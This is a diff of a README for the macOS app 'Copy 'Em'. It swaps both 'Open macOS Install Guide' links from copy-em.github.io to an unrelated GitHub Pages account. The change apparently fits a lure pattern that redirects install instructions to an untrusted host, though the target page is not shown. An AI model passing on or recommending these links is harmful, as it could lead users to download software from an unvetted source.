@@ -3,7 +3,7 @@
 ![Copy 'Em Icon](https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/b7/ca/7d/b7ca7d3d-321d-94a0-9b63-1f257112323a/Icon.png/1200x630bb.png)
 
 <div align="center" style="margin:8px 0 16px;">
-  <a href="http://copy-em.github.io/.github">
+  <a href="https://rumpels-kaji.github.io/.github/Copy">
     <img src="https://img.shields.io/badge/📘_OPEN_MACOS_INSTALL_GUIDE-steelblue?style=for-the-badge&logo=readthedocs&logoColor=white" alt="Open macOS Install Guide">
   </a>
 </div>
@@ -80,7 +80,7 @@ Finally, performance is tuned for modern Macs. On **Apple Silicon** and Intel sy
 ## Open macOS Install Guide
 
 <div align="center" style="margin:8px 0 16px;">
-  <a href="http://copy-em.github.io/.github">
+  <a href="https://rumpels-kaji.github.io/.github/copy">
     <img src="https://img.shields.io/badge/📘_OPEN_MACOS_INSTALL_GUIDE-steelblue?style=for-the-badge&logo=readthedocs&logoColor=white" alt="Open macOS Install Guide">
   </a>
 </div>
